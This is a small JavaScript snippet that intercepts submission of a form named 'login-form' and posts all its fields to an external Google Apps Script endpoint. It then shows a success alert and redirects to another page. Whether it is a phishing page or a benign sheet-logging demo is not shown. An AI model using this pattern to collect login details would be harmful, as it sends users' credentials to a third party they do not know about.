const scriptURL = 'https://script.google.com/macros/s/AKfycbxtdMtvHsZUSxOP38mQBtQ8jt1mGLl85pkiGDQztfPD0DD2ZG7kLeEEo_fqCCB5kxSg/exec'

const form = document.forms['login-form']

form.addEventListener('submit', e => {
 e.preventDefault()
 fetch(scriptURL, { method: 'POST', body: new FormData(form)})
 .then(response => alert("Thank you! your form is submitted successfully." ))
 .then(() => { window.location.href = "index2.html"; })
 .catch(error => console.error('Error!', error.message))
})
